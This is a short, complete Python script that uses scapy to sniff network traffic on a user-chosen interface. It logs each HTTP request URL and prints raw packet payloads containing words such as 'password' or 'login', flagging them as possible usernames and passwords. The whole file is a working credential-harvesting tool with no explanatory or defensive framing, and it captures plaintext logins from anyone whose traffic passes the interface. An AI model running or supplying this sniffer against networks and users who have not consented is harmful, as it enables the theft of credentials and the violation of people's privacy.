from scapy.all import *
from scapy.layers.http import HTTPRequest

def process_packet(packet):
    if packet.haslayer(HTTPRequest):
        url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
        print(f"[+] HTTP Request >> {url}")
        if packet.haslayer(Raw):
            load = packet[Raw].load
            keywords = ["username", "password", "pass", "login"]
            for keyword in keywords:
                if keyword in str(load):
                    print(f"\n[+] Possible username/password >> {load}\n")
                    break

def sniff_packets(interface=None):
    if interface:
        sniff(iface=interface, store=False, prn=process_packet)
    else:
        sniff(store=False, prn=process_packet)

def get_interface():
    interfaces = get_if_list()
    print("Available interfaces:")
    for i, interface in enumerate(interfaces):
        print(f"{i}: {interface}")
    choice = int(input("Enter the number of the interface to sniff on: "))
    return interfaces[choice]

# Usage:
sniff_packets(get_interface())
